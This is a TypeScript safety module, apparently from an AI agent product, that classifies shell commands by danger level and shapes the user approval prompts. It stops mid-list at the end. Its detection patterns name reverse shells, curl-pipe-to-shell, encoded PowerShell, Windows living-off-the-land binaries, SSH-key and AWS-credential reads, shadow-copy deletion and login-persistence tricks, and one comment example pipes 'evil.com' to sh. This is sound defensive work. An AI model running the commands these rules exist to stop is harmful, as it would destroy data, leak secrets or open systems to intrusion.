/**
 * Command Safety Module
 * Analyzes shell commands for potential dangers and provides safety levels
 */

import { getI18n } from '../../i18n';
import { isWindows } from '../../utils/platform';
import { isReadOnlyCommand } from './readOnlyDetector';
import { commandWriteTargetWords } from '../permissions/commandBoundary';
import type { BrowserOperationClass } from '../permissions/browserToolPolicy';

export type DangerLevel = 'safe' | 'warn' | 'danger' | 'block';

export interface CommandAnalysis {
  level: DangerLevel;
  reason: string;
  matchedPattern?: string;
  /** Whether the command is read-only (no side effects). Used for concurrency safety and UI hints. */
  readOnly: boolean;
}

export interface ConfirmationInfo {
  teamIdentity?: import('../agent/teamConfirmationIdentity').TeamConfirmationIdentity;
  command: string;
  level: DangerLevel;
  reason: string;
  /**
   * What the user is being asked to approve. The dialog's wording follows this:
   * a shell command, a browser action, and a new long-lived capability are not
   * the same decision, and describing all three as "命令" leaves the user
   * unable to judge what they are agreeing to. Defaults to 'command' so every
   * existing caller keeps its current wording.
   *
   * `'browser-upload'` is a browser action in every other respect — it takes
   * the same origin fields, offers the same site grant, blocks the same site
   * — but it is the one whose consequence leaves the machine, so it gets its
   * own question and its own verb rather than 「浏览器操作: <tool name>」 over
   * 「确认执行」 (acceptance F5).
   */
  kind?: 'command' | 'browser' | 'browser-upload' | 'self-extension';
  /**
   * An action the product stops for in every mode: a connector tool that
   * sends to other people, deletes in a connected service or moves money
   * (`connectorActionPolicy.ts`). A capability tier that approves on its own
   * (the IM and trigger `full` tiers) still hands it to a person — the run's
   * approval channel, or a refusal when it has none.
   */
  alwaysAsks?: true;
  /**
   * Upload confirmations only: how many files this call would send. The
   * dialog puts it in the question ("上传 2 个文件到 …"), which is the part a
   * person reads before the list.
   */
  browserUploadFileCount?: number;
  /**
   * Browser confirmations only: the exact origin the action targets, when it
   * could be resolved. Lets the dialog offer "always allow this site".
   */
  browserOrigin?: string;
  /**
   * Browser confirmations only: the OTHER sites this page embeds as regions
   * the automation can address (iframes), when there are any.
   *
   * A cross-origin region is authorized on its own account — a grant for the
   * page does not cover it — but asking region by region turns one form into a
   * wall of prompts. So the ask names them together and "always allow" writes
   * a grant for each named origin SEPARATELY (never a wildcard), which is what
   * keeps per-origin authorization honest and the prompt count at one.
   *
   * Only origins the browser confirmed appear here: a region this channel
   * cannot see into reports an origin the embedding page could have authored,
   * and nothing may be granted on the strength of that.
   */
  browserEmbeddedOrigins?: string[];
  /**
   * Browser confirmations only: the origin of the PAGE, when the action's own
   * target is a region inside it.
   *
   * `browserOrigin` is where the action EXECUTES, which for a frame-targeted
   * call is the third-party region — so on its own it leaves the dialog saying
   * `vendor.example.net` to a user who is looking at `oa.example.com`, with
   * the page they are actually on named nowhere. Absent when the two are the
   * same site, which is every non-frame call.
   */
  browserPageOrigin?: string;
  /**
   * Browser confirmations only: whether the dialog may offer a persistent
   * per-site grant. False for scripting tools (execute_js) and for actions
   * whose origin could not be resolved — those are approved one use at a
   * time. The requester decides this, mirroring how competitors dispatch
   * allowed persistence scopes per request instead of letting the dialog
   * guess.
   */
  allowPersistentGrant?: boolean;
  /**
   * Browser confirmations only: which operation class the action belongs to.
   * Carried so a callback that is NOT the desktop dialog — an unattended
   * tier's auto-approve callback, a future IM approval round-trip — can apply
   * the operation-class policy itself instead of trusting that whoever built
   * the request already did. Absent means "unclassified", and every consumer
   * treats that as the strictest class.
   */
  browserOperationClass?: BrowserOperationClass;
  browserPermissionResource?: import('../permissions/browserPermissionDefaults').BrowserPermissionResource;
  browserPermissionTargets?: import('../permissions/browserPermissionConfig').BrowserPermissionTarget[];
  /**
   * Set when the requester has ALREADY refused this action and is calling the
   * callback only so the run can ACCOUNT for the refusal — the scheduler turns
   * these into its "blocked acting on example.com" run-result line, which is
   * the only way a 3am task explains itself.
   *
   * It is a notification, not a request. The return value is not consulted,
   * and a callback that sees this field must not treat it as an approval
   * prompt — in particular it must never forward it to a human approval
   * channel, since the decision is already made and asking would be a lie.
   * Holds the user-facing reason for the refusal.
   */
  deniedNotice?: string;
  /** Sub-agent that raised the request (display only), when known. */
  agentName?: string;
}

/**
 * Normalize command to detect obfuscation attempts
 * This helps catch bypass techniques like extra spaces, backslashes, etc.
 */
function normalizeCommand(command: string): string {
  let normalized = command;

  // Remove backslash escapes (e.g., \rm -> rm)
  normalized = normalized.replace(/\\([a-zA-Z])/g, '$1');

  // Normalize multiple spaces to single space
  normalized = normalized.replace(/\s+/g, ' ');

  // Remove leading/trailing whitespace
  normalized = normalized.trim();

  return normalized;
}

/**
 * Tokenize enough shell syntax to distinguish command arguments from quoted
 * path content. Quotes and backslash escapes are removed like a shell would;
 * command separators are retained as boundaries.
 */
function tokenizeShellWords(command: string): string[] {
  const words: string[] = [];
  let current = '';
  let quote: "'" | '"' | null = null;
  let escaped = false;

  const pushCurrent = () => {
    if (current) words.push(current);
    current = '';
  };

  for (let index = 0; index < command.length; index++) {
    const ch = command[index];

    if (escaped) {
      current += ch;
      escaped = false;
      continue;
    }

    if (quote) {
      if (ch === quote) {
        quote = null;
      } else if (ch === '\\' && quote === '"') {
        escaped = true;
      } else {
        current += ch;
      }
      continue;
    }

    if (ch === "'" || ch === '"') {
      quote = ch;
    } else if (ch === '\\') {
      escaped = true;
    } else if (/\s/.test(ch)) {
      pushCurrent();
    } else if (
      ch === '&'
      && (command[index + 1] === '>' || current.endsWith('>') || current.endsWith('<'))
    ) {
      current += ch;
    } else if (ch === '|' || ch === ';' || ch === '&') {
      pushCurrent();
      words.push(ch);
    } else {
      current += ch;
    }
  }

  if (escaped) current += '\\';
  pushCurrent();
  return words;
}

/**
 * Detect recursive rm flags as shell argument tokens. A raw substring search
 * is unsafe here: paths such as `/tmp/report-R-final` contain `-R` but are not
 * recursive options, and everything after `--` is explicitly an operand.
 */
function hasRmRecursiveOption(command: string): boolean {
  const words = tokenizeShellWords(command);
  const commandBoundaries = new Set(['|', ';', '&']);

  let segmentStart = 0;
  while (segmentStart < words.length) {
    let segmentEnd = segmentStart;
    while (segmentEnd < words.length && !commandBoundaries.has(words[segmentEnd])) {
      segmentEnd++;
    }

    let rmIndex = -1;
    for (let index = segmentStart; index < segmentEnd; index++) {
      const executable = words[index].split('/').pop();
      if (executable === 'rm') {
        rmIndex = index;
        break;
      }
    }

    if (rmIndex >= 0) {
      for (let argIndex = rmIndex + 1; argIndex < segmentEnd; argIndex++) {
        const argument = words[argIndex];
        if (argument === '--') break;
        const isLongRecursiveOption = (
          argument.length > 2
          && argument.startsWith('--')
          && '--recursive'.startsWith(argument)
        );
        if (isLongRecursiveOption || /^-[^-]*[rR]/.test(argument)) {
          return true;
        }
      }
    }

    segmentStart = segmentEnd + 1;
  }

  return false;
}

/**
 * Check for command injection patterns
 */
function hasCommandInjection(command: string): { injected: boolean; reason: string } {
  const t = getI18n().toolResult.commandSafety;
  // Check for command chaining that might hide dangerous commands
  const injectionPatterns = [
    { pattern: /;\s*rm\s/, reason: t.injSemicolonRm },
    { pattern: /\|\s*rm\s/, reason: t.injPipeRm },
    { pattern: /&&\s*rm\s/, reason: t.injAmpRm },
    { pattern: /\|\|\s*rm\s/, reason: t.injOrRm },
    { pattern: /\$\(.*rm\s/, reason: t.injSubstRm },
    { pattern: /`.*rm\s.*`/, reason: t.injBacktickRm },
    // No blanket backtick rule: substitution alone isn't dangerous (e.g. files=`ls`); dangerous content is caught by the specific rules.
    { pattern: /;\s*sudo\s/, reason: t.injSemicolonSudo },
    { pattern: /\|\s*sudo\s/, reason: t.injPipeSudo },
    { pattern: /eval\s/, reason: t.injEvalArbitrary },
    { pattern: /\bexec\s/, reason: t.injExecReplace },
    { pattern: /source\s+\/dev\/tcp/, reason: t.injDevTcpSource },
    { pattern: /\bsource\s+<\(/, reason: t.injProcessSubstitution },
    { pattern: /bash\s+-i/, reason: t.injBashInteractive },
    { pattern: /nc\s+.*-e/, reason: t.injNcReverseShell },
    { pattern: /python.*-c.*socket/, reason: t.injPythonSocket },
    { pattern: /python.*-c.*os\.system/, reason: t.injPythonOsSystem },
    { pattern: /python.*-c.*subprocess/, reason: t.injPythonSubprocess },
    { pattern: /perl.*-e.*system/, reason: t.injPerlSystem },
    { pattern: /ruby.*-e.*system/, reason: t.injRubySystem },
    { pattern: /\$\{?IFS\}?/, reason: t.injIfsBypass },
    { pattern: /\{[a-z]+,/, reason: t.injBraceExpand },
    { pattern: /\$\{[^}]*[`$]/, reason: t.injNestedVarSubst },
    { pattern: />\s*\/dev\/tcp\//, reason: t.injDevTcpRedirect },
    { pattern: /\|\s*base64\s+-d\s*\|/, reason: t.injBase64Pipe },
    { pattern: /echo\s+.*\|\s*(ba)?sh/, reason: t.injEchoPipeShell },
    { pattern: /printf\s+.*\|\s*(ba)?sh/, reason: t.injPrintfPipeShell },
  ];

  for (const { pattern, reason } of injectionPatterns) {
    if (pattern.test(command)) {
      return { injected: true, reason };
    }
  }

  // Windows-specific injection patterns (only checked on Windows)
  if (isWindows()) {
    const winInjectionPatterns = [
      { pattern: /[&|]\s*del\s/i, reason: t.injWinPipeDel },
      { pattern: /[&|]\s*format\s/i, reason: t.injWinPipeFormat },
      { pattern: /&&\s*format\s/i, reason: t.injWinAmpFormat },
      // PowerShell semicolon-chained destructive commands (root cause of desktop deletion incident)
      { pattern: /;\s*Remove-Item\b/i, reason: t.injWinSemicolonRemoveItem },
      { pattern: /;\s*ri\b/i, reason: t.injWinSemicolonRi },
      { pattern: /;\s*erase\b/i, reason: t.injWinSemicolonErase },
      { pattern: /powershell\s+.*-enc\b/i, reason: t.injWinPsEncodedCmd },
      { pattern: /powershell\s+.*-encodedcommand\b/i, reason: t.injWinPsEncodedCmdShort },
      { pattern: /powershell\s+.*-w\s+hidden/i, reason: t.injWinPsHidden },
      { pattern: /powershell\s+.*-nop\b/i, reason: t.injWinPsNoProfile },
      { pattern: /cmd\s+\/c\s+.*del\s/i, reason: t.injWinCmdDel },
    ];
    for (const { pattern, reason } of winInjectionPatterns) {
      if (pattern.test(command)) {
        return { injected: true, reason };
      }
    }
  }

  return { injected: false, reason: '' };
}

// ── Windows-specific dangerous command patterns ──

/**
 * Windows-specific dangerous command patterns organized by severity level.
 * Returns a new object each call so that reasons are resolved at call time
 * via getI18n() (must NOT run at module load).
 */
function getWinDangerousPatterns(): Record<Exclude<DangerLevel, 'safe'>, Array<{ pattern: RegExp; reason: string }>> {
  const t = getI18n().toolResult.commandSafety;
  return {
    block: [
      { pattern: /del\s+\/s\s+\/q\s+[a-zA-Z]:\\/i, reason: t.winDelRecursiveDrive },
      { pattern: /format\s+[a-zA-Z]:/i, reason: t.winFormatDisk },
      { pattern: /reg\s+delete\s+HKLM/i, reason: t.winRegDeleteSystem },
      { pattern: />\s*\\\\\.\\PhysicalDrive/i, reason: t.winOverwritePhysicalDisk },
      { pattern: /diskpart/i, reason: t.winDiskpart },
      { pattern: /bcdedit/i, reason: t.winBcdedit },
      { pattern: /cipher\s+\/w/i, reason: t.winCipherWipe },
      { pattern: />\s*.*\\Microsoft\.PowerShell_profile\.ps1/i, reason: t.winBlockPsProfile },
      { pattern: /rundll32\s+/i, reason: t.winRundll32 },
      { pattern: /regsvcs\s+/i, reason: t.winRegsvcs },
      { pattern: /regasm\s+/i, reason: t.winRegasm },
      { pattern: /InstallUtil\s+/i, reason: t.winInstallUtil },
      { pattern: /mavinject\s+/i, reason: t.winMavinject },
      { pattern: /mshta\s+vbscript:/i, reason: t.winMshtaVbscript },
      { pattern: /mshta\s+javascript:/i, reason: t.winMshtaJavascript },
      { pattern: /fodhelper/i, reason: t.winFodhelper },
      { pattern: /certutil\s+.*-encode/i, reason: t.winCertutilEncode },
    ],
    danger: [
      { pattern: /del\s+\/s\b/i, reason: t.winDelRecursive },
      { pattern: /rmdir\s+\/s\b/i, reason: t.winRmdirRecursive },
      // PowerShell Remove-Item with -Recurse (catches the exact bug: desktop files deleted en masse)
      { pattern: /\bRemove-Item\b.*-Recurse\b/i, reason: t.winPsRemoveItemRecurse },
      { pattern: /\bRemove-Item\b.*\s-[rR]\b/i, reason: t.winPsRemoveItemRecurse },
      { pattern: /\bri\b.*-Recurse\b/i, reason: t.winPsRiRecurse },
      { pattern: /\bri\b.*\s-[rR]\b/i, reason: t.winPsRiRecurse },
      { pattern: /reg\s+delete\b/i, reason: t.winRegDelete },
      { pattern: /reg\s+export\b/i, reason: t.winRegExport },
      { pattern: /reg\s+save\b/i, reason: t.winRegSave },
      { pattern: /powershell\s+.*-executionpolicy\s+bypass/i, reason: t.winPsBypassPolicy },
      { pattern: /Invoke-WebRequest.*\|\s*iex/i, reason: t.winInvokeWebExec },
      { pattern: /Invoke-Expression/i, reason: t.winInvokeExpression },
      { pattern: /IEX\s*\(/i, reason: t.winInvokeExpression },
      { pattern: /certutil\s+.*-decode/i, reason: t.winCertutilDecode },
      { pattern: /certutil\s+.*-urlcache/i, reason: t.winCertutilUrlcache },
      { pattern: /bitsadmin\s+.*\/transfer/i, reason: t.winBitsadmin },
      { pattern: /mshta\s+/i, reason: t.winMshta },
      { pattern: /wmic\s+.*process\s+call\s+create/i, reason: t.winWmicProcessCreate },
      { pattern: /wmic\s+.*os\s+.*delete/i, reason: t.winWmicOsDelete },
      { pattern: /cscript.*\/\/e:jscript/i, reason: t.winCscriptExec },
      { pattern: /wscript.*\/\/e:jscript/i, reason: t.winWscriptExec },
      { pattern: /takeown\s+.*\/r/i, reason: t.winTakeownRecurse },
      { pattern: /icacls\s+.*\/grant.*Everyone/i, reason: t.winIcaclsGrantAll },
      { pattern: /netsh\s+.*wlan\s+.*key/i, reason: t.winNetshWlanKey },
      { pattern: /vssadmin\s+delete\s+shadows/i, reason: t.winVssDeleteShadows },
    ],
    warn: [
      { pattern: /del\s+/i, reason: t.winDelFile },
      { pattern: /rmdir\s+/i, reason: t.winRmdirDir },
      // PowerShell file deletion cmdlets and common aliases (bare, without -Recurse)
      { pattern: /\bRemove-Item\b/i, reason: t.winPsRemoveItem },
      { pattern: /\bri\b\s/i, reason: t.winPsRi },
      { pattern: /\berase\b/i, reason: t.winPsErase },
      { pattern: /\bClear-Content\b/i, reason: t.winPsClearContent },
      { pattern: /\bClear-RecycleBin\b/i, reason: t.winPsClearRecycleBin },
      { pattern: /\brunas\s+/i, reason: t.winRunas },
      { pattern: /\btaskkill\s+\/f/i, reason: t.winTaskkillForce },
      { pattern: /\bnet\s+stop\b/i, reason: t.winNetStop },
      { pattern: /\bsc\s+delete\b/i, reason: t.winScDelete },
      { pattern: /\bschtasks\s+\/delete/i, reason: t.winSchtasksDelete },
      { pattern: /\btakeown\s+/i, reason: t.winTakeown },
      { pattern: /\bicacls\s+/i, reason: t.winIcacls },
      { pattern: /\breg\s+add\b/i, reason: t.winRegAdd },
      { pattern: /\bwmic\s+/i, reason: t.winWmic },
      { pattern: /\bnetsh\s+.*firewall/i, reason: t.winNetshFirewall },
      { pattern: /\bnetsh\s+.*advfirewall/i, reason: t.winNetshAdvFirewall },
    ],
  };
}

/**
 * Severity order for comparing DangerLevels.
 * Higher index = more severe.
 */
const DANGER_ORDER: DangerLevel[] = ['safe', 'warn', 'danger', 'block'];

/**
 * A command that makes a program start when the user signs in: writing into
 * `~/Library/LaunchAgents` / `LaunchDaemons`, loading a launch agent, adding a
 * login item, installing a crontab, writing a shell login or profile script
 * (`.zprofile`, `.bash_profile`, fish `config.fish`, a PowerShell profile),
 * writing into the Windows Startup folder, writing a `Run` / `RunOnce` or
 * Winlogon `Shell` / `Userinit` registry value or `UserInitMprLogonScript`, or
 * a scheduled task that runs at logon or boot.
 *
 * Refused in every mode (`block`): the file tools cannot write there either
 * (`pathSafety.ts`), and a command must not be the way around that. Read over
 * the WHOLE command line, before the safe list and before the injection check:
 * `cp` is on the safe list, and `cd ~/Library/LaunchAgents && cp x.plist .`
 * names the folder in one part and writes in another. Only reading those
 * places (`ls`, `cat`, `reg query`, `crontab -l`) is left alone, and taking an
 * entry away (`rm` of a launch agent, `launchctl unload`, `crontab -r`) asks
 * (`warn`) instead: that undoes an automatic start, it does not add one.
 *
 * The launch folders count where they are named as a folder of a path
 * (`~/Library/LaunchAgents/x.plist`, `LaunchAgents/`), not as a word in a
 * sentence: a commit message about LaunchAgents writes nothing there.
 */
function autostartCommand(command: string): { level: 'block' | 'warn'; reason: string } | null {
  const t = getI18n().toolResult.commandSafety;
  const block = { level: 'block' as const, reason: t.blockAutostart };
  const readOnly = isReadOnlyCommand(command);
  const mentionsLaunchFolder = /(?:[\\/]Launch(?:Agents|Daemons)(?=[\\/\s'"`;&|)]|$)|\bLaunch(?:Agents|Daemons)[\\/])/i.test(command);
  const mentionsStartupFolder = /Start Menu[\\/]+Programs[\\/]+Startup\b/i.test(command)
    || /shell:(common\s+)?startup\b/i.test(command);
  if ((mentionsLaunchFolder || mentionsStartupFolder) && !readOnly) {
    return removesAutostartEntries(command) ? { level: 'warn', reason: t.warnRemoveAutostart } : block;
  }
  if (/\blaunchctl\s+(load|bootstrap|submit|enable)\b/i.test(command)) return block;
  if (/osascript[\s\S]*\blogin item\b/i.test(command) && /\b(make|add)\b/i.test(command)) return block;
  if (/\bdefaults\s+write\b[\s\S]*\b(LoginHook|AutoLaunchedApplicationDictionary)\b/i.test(command)) return block;
  const crontab = crontabUse(command);
  if (crontab === 'install') return block;
  if (commandWriteTargetWords(command).some(isLoginScriptPath)) return block;
  const onlyReadsRegistry = /^\s*(reg(\.exe)?\s+query|Get-ItemProperty|Get-Item|Get-ChildItem|gp|gi|gci)\b/i.test(command)
    && !/[;&|]/.test(command);
  if (/[\\/](CurrentVersion|Explorer)[\\/]Run(Once|Services|ServicesOnce)?\b/i.test(command) && !onlyReadsRegistry) return block;
  if (/[\\/]Winlogon\b/i.test(command) && /\b(Shell|Userinit)\b/i.test(command) && !onlyReadsRegistry) return block;
  if (/\bUserInitMprLogonScript\b/i.test(command) && !onlyReadsRegistry) return block;
  if (/\bschtasks(\.exe)?\b[\s\S]*\/create\b[\s\S]*\/sc\s+(onlogon|onstart)\b/i.test(command)) return block;
  if (/\bNew-ScheduledTaskTrigger\b[\s\S]*-At(LogOn|Startup)\b/i.test(command)) return block;
  if (crontab === 'remove') return { level: 'warn', reason: t.warnRemoveAutostart };
  return null;
}

/**
 * The shell login and profile scripts, which run at every sign-in or new
 * shell: by name, wherever the command puts them (the file tools close them by
 * path in `pathSafety.ts`).
 */
const LOGIN_SCRIPT_PATH = /(?:^|[\\/])(?:\.zlogin|\.zprofile|\.zshrc|\.zshenv|\.bash_login|\.bash_profile|\.bashrc|\.profile|config\.fish|(?:Microsoft\.[A-Za-z]+_)?profile\.ps1)$/i;
const FISH_CONF_D = /[\\/]fish[\\/]conf\.d[\\/]/i;

function isLoginScriptPath(word: string): boolean {
  // `-Path ($PROFILE)` and `-Path "$PROFILE"` name the same file as `$PROFILE`.
  const path = word.replace(/^["'(]+|["')]+$/g, '').replace(/^\$\(\s*/, '');
  // `$PROFILE` (and `$PROFILE.CurrentUserAllHosts`) is PowerShell's own name for the profile.
  return LOGIN_SCRIPT_PATH.test(path) || FISH_CONF_D.test(path) || /^\$profile\b/i.test(path);
}

/** What the `crontab` calls of a command do: list only, remove, or install / edit. */
function crontabUse(command: string): 'install' | 'remove' | 'list' | null {
  // Installing returns at once, so only these two are ever held.
  let use: 'remove' | 'list' | null = null;
  // The program may be named bare, quoted (`"crontab"`), escaped (`\\crontab`) or by a path
  // (`/usr/bin/crontab`). A path counts where a command goes (after a separator or `sudo`), so
  // reading a file called crontab (`cat /etc/crontab`) is not a crontab call.
  const bare = '(?:^|[\\s;&|(`$])["\']?\\\\?crontab["\']?';
  const viaPath = '(?:^|[;&|(`]|\\b(?:sudo|env|command|exec|nohup|xargs)\\s)\\s*["\']?[^\\s;&|()`"\']*[\\\\/]crontab["\']?';
  const callPattern = new RegExp(`(?:${bare}|${viaPath})(?![\\w.-])([^;&|\\n)\`]*)`, 'gi');
  for (const match of command.matchAll(callPattern)) {
    // A redirection is not an argument: `crontab -l 2>/dev/null`, `crontab -l > backup`.
    const args = match[1].replace(/\d*[<>]+&?\s*\S*/g, ' ').trim().split(/\s+/).filter(Boolean);
    // `-u <user>` names whose table it is.
    const own = args.filter((arg, index) => arg !== '-u' && args[index - 1] !== '-u');
    if (own.length === 1 && own[0] === '-l') {
      use ??= 'list';
    } else if (own.length >= 1 && own.every((arg) => /^-[ir]+$/.test(arg)) && own.some((arg) => arg.includes('r'))) {
      use = 'remove';
    } else {
      // A file, `-` (the input), `-e`, or nothing (the input too) installs a table.
      return 'install';
    }
  }
  return use;
}

/**
 * Whether every part of the command is taking an entry away (`rm`, `unlink`,
 * `trash`, `launchctl unload|bootout|remove|disable`), moving into the folder
 * to do so (`cd`), or only reading, with at least one removal among them.
 * Parts are split on the shell's separators; a quoted separator splits too,
 * which only ever makes the command look like more than a removal.
 */
function removesAutostartEntries(command: string): boolean {
  const parts = command.split(/&&|\|\||[;|\n]/).map((part) => part.trim()).filter(Boolean);
  let removes = false;
  for (const part of parts) {
    if (/^(?:sudo\s+)?(?:rm|rmdir|unlink|trash)\b/i.test(part)
      || /^(?:sudo\s+)?launchctl\s+(?:unload|bootout|remove|disable)\b/i.test(part)) {
      removes = true;
    } else if (!/^cd\b/i.test(part) && !isReadOnlyCommand(part)) {
      return false;
    }
  }
  return removes;
}

function compareDanger(a: DangerLevel, b: DangerLevel): number {
  return DANGER_ORDER.indexOf(a) - DANGER_ORDER.indexOf(b);
}

/**
 * Split a compound command into individual segments, respecting quoted strings.
 *
 * Splits on `&&`, `||`, and `;` (sequential operators) but NOT on `|` (pipe).
 * Pipe-connected commands form a single pipeline where danger patterns already
 * span the full string (e.g. `curl ... | sh` is caught by the `curl.*\|.*sh` pattern).
 * Splitting on `;` is the critical fix: `cd X; Remove-Item Y -Recurse` must not
 * be short-circuited as safe because `cd` matches a safe pattern.
 *
 * Quoted strings are respected — `;` or `&&` inside quotes are not treated as separators.
 *
 * Examples:
 *   'cd X; Remove-Item Y'         → ['cd X', 'Remove-Item Y']
 *   'Write-Output "a;b"'          → ['Write-Output "a;b"']   (semicolon inside quotes → not split)
 *   'git status && git log'        → ['git status', 'git log']
 *   'curl http://evil.com | sh'   → ['curl http://evil.com | sh']  (pipe → not split)
 */
function splitCompoundCommand(command: string): string[] {
  const segments: string[] = [];
  let current = '';
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let i = 0;

  while (i < command.length) {
    const ch = command[i];

    // Track quote state (no nesting support, but covers common shell usage)
    if (ch === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      current += ch;
      i++;
      continue;
    }
    if (ch === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      current += ch;
      i++;
      continue;
    }

    if (!inSingleQuote && !inDoubleQuote) {
      // Check two-character operators first (&&, ||)
      if (i + 1 < command.length) {
        const two = command.slice(i, i + 2);
        if (two === '&&' || two === '||') {
          const seg = current.trim();
          if (seg) segments.push(seg);
          current = '';
          i += 2;
          continue;
        }
      }
      // Semicolon sequential separator
      if (ch === ';') {
        const seg = current.trim();
        if (seg) segments.push(seg);
        current = '';
        i++;
        continue;
      }
      // NOTE: single `|` (pipe) is intentionally NOT split here — danger patterns
      // that involve pipes (e.g. `curl ... | sh`) already test the full command string.
    }

    current += ch;
    i++;
  }

  const seg = current.trim();
  if (seg) segments.push(seg);

  // If nothing was split (no separators found), return the original command as-is
  return segments.length > 0 ? segments : [command.trim()];
}

const WIN_SAFE_PATTERNS: RegExp[] = [
  /^dir(\s|$)/i,
  /^type(\s|$)/i,
  /^where(\s|$)/i,
  /^echo(\s|$)/i,
  /^cd(\s|$)/i,
  /^chdir(\s|$)/i,
  /^mkdir(\s|$)/i,
  /^hostname(\s|$)/i,
  /^ipconfig(\s|$)/i,
  /^whoami(\s|$)/i,
  /^set(\s|$)/i,
  /^cls(\s|$)/i,
  /^copy(\s|$)/i,
  /^move(\s|$)/i,
  /^start(\s|$)/i,       // Windows equivalent of macOS 'open'
  /^explorer(\s|$)/i,    // Open files/folders in Explorer
  /^tasklist(\s|$)/i,    // List processes
  /^systeminfo(\s|$)/i,  // System information
  /^findstr(\s|$)/i,     // Windows grep
  /^tree(\s|$)/i,        // Directory tree
  /^more(\s|$)/i,        // Paginated view
  /^fc(\s|$)/i,          // File compare
  /^ver(\s|$)/i,         // System version
  /^path(\s|$)/i,        // View PATH
];

/**
 * Dangerous command patterns organized by severity level.
 * Returns a new object each call so that reasons are resolved at call time
 * via getI18n() (must NOT run at module load).
 */
function getDangerousPatterns(): Record<Exclude<DangerLevel, 'safe'>, Array<{ pattern: RegExp; reason: string }>> {
  const t = getI18n().toolResult.commandSafety;
  return {
    block: [
      // System-critical destructive commands
      { pattern: /rm\s+.*(-r\s+-f|-f\s+-r|-rf|-fr|--recursive)\s+\/$/, reason: t.blockRmRoot },
      { pattern: /rm\s+.*(-r\s+-f|-f\s+-r|-rf|-fr|--recursive)\s+~\/?$/, reason: t.blockRmHome },
      { pattern: /rm\s+.*(-r\s+-f|-f\s+-r|-rf|-fr|--recursive)\s+\/\*/, reason: t.blockRmRootWild },
      { pattern: /rm\s+.*(-r\s+-f|-f\s+-r|-rf|-fr|--recursive)\s+~\/\*/, reason: t.blockRmHomeWild },
      { pattern: /sudo\s+rm\s+.*(-r|-f|--recursive).*\/$/, reason: t.blockSudoRmRoot },
      { pattern: />\s*\/dev\/sd[a-z]/, reason: t.blockDdSda },
      { pattern: />\s*\/dev\/nvme/, reason: t.blockDdNvme },
      { pattern: /dd\s+.*of=\/dev\//, reason: t.blockDdDisk },
      { pattern: /mkfs\./, reason: t.blockMkfs },
      { pattern: /:\s*\(\)\s*\{/, reason: t.blockForkBomb },
      { pattern: />\s*\/dev\/null\s*2>&1\s*&/, reason: t.blockSilentBg },
      // Prevent reading/writing sensitive files via commands
      { pattern: /cat\s+.*\.ssh\/id_/, reason: t.blockCatSshKey },
      { pattern: /cat\s+.*\.aws\/credentials/, reason: t.blockCatAwsCreds },
      { pattern: />\s*.*\.ssh\/authorized_keys/, reason: t.blockWriteSshKeys },
      { pattern: />\s*.*\.bashrc/, reason: t.blockWriteShellRc },
      { pattern: />\s*.*\.zshrc/, reason: t.blockWriteShellRc },
      { pattern: />\s*.*\.profile/, reason: t.blockWriteShellRc },
    ],
    danger: [
      // Destructive but may be intentional (with various flag combinations)
      { pattern: /rm\s+.*\*/, reason: t.dangerRmWild },
      { pattern: /git\s+push\s+.*(-f|--force)/, reason: t.dangerGitPushForce },
      { pattern: /git\s+reset\s+--hard/, reason: t.dangerGitResetHard },
      { pattern: /git\s+clean\s+.*-f/, reason: t.dangerGitCleanF },
      { pattern: /git\s+checkout\s+--\s*\.$/, reason: t.dangerGitCheckoutDot },
      { pattern: /chmod\s+777/, reason: t.dangerChmod777 },
      { pattern: /chmod\s+-R\s+777/, reason: t.dangerChmodR777 },
      { pattern: /curl.*\|\s*(ba)?sh/, reason: t.dangerCurlPipeSh },
      { pattern: /wget.*\|\s*(ba)?sh/, reason: t.dangerCurlPipeSh },
      { pattern: /curl.*\|\s*python/, reason: t.dangerCurlPipePython },
      { pattern: /pip\s+install.*--break-system-packages/, reason: t.dangerPipBreakSystem },
      { pattern: /npm\s+.*--force/, reason: t.dangerNpmForce },
      { pattern: /bash\s+-c\s+\$?["'].*rm\s/, reason: t.dangerBashCRm },
      { pattern: /sh\s+-c\s+\$?["'].*rm\s/, reason: t.dangerShCRm },
      { pattern: /xargs\s+.*rm/, reason: t.dangerXargsRm },
      { pattern: /find\s+.*-delete/, reason: t.dangerFindDelete },
      { pattern: /find\s+.*-exec\s+rm/, reason: t.dangerFindExecRm },
    ],
    warn: [
      // Common commands that should be confirmed
      { pattern: /sudo\s+/, reason: t.warnSudo },
      { pattern: /rm\s+/, reason: t.warnRm },
      { pattern: /git\s+push/, reason: t.warnGitPush },
      { pattern: /npm\s+publish/, reason: t.warnNpmPublish },
      { pattern: /brew\s+uninstall/, reason: t.warnBrewUninstall },
      { pattern: /pip\s+uninstall/, reason: t.warnPipUninstall },
      { pattern: /apt\s+remove/, reason: t.warnAptRemove },
      { pattern: /apt-get\s+remove/, reason: t.warnAptRemove },
      { pattern: /apt\s+purge/, reason: t.warnAptPurge },
      { pattern: /yum\s+remove/, reason: t.warnAptRemove },
      { pattern: /dnf\s+remove/, reason: t.warnAptRemove },
      { pattern: /mv\s+.*\/dev\/null/, reason: t.warnMvDevNull },
      { pattern: /truncate\s+/, reason: t.warnTruncate },
      { pattern: /shred\s+/, reason: t.warnShred },
      { pattern: /kill\s+-9/, reason: t.warnKill9 },
      { pattern: /killall\s+/, reason: t.warnKillall },
      { pattern: /pkill\s+/, reason: t.warnPkill },
      { pattern: /systemctl\s+(stop|disable|mask)/, reason: t.warnSystemctlStop },
      { pattern: /launchctl\s+(unload|remove)/, reason: t.warnLaunchctl },
    ],
  };
}

/**
 * Safe command patterns - commands that are always allowed without confirmation
 */
const SAFE_PATTERNS: RegExp[] = [
  /^ls(\s|$)/,
  /^pwd(\s|$)/,
  /^echo(\s|$)/,
  /^cat(\s|$)/,
  /^head(\s|$)/,
  /^tail(\s|$)/,
  /^grep(\s|$)/,
  /^find(\s|$)/,
  /^rg(\s|$)/,
  /^which(\s|$)/,
  /^whoami(\s|$)/,
  /^date(\s|$)/,
  /^cd(\s|$)/,
  /^mkdir(\s|$)/,
  /^touch(\s|$)/,
  /^cp(\s|$)/,
  /^node(\s|$)/,
  /^python(\s|$)/,
  /^python3(\s|$)/,
  /^npm\s+(run|start|test|build|install|ci|list|ls|outdated)(\s|$)/,
  /^yarn\s+(run|start|test|build|install|list|outdated)(\s|$)/,
  /^pnpm\s+(run|start|test|build|install|list|outdated)(\s|$)/,
  /^bun\s+(run|start|test|build|install)(\s|$)/,
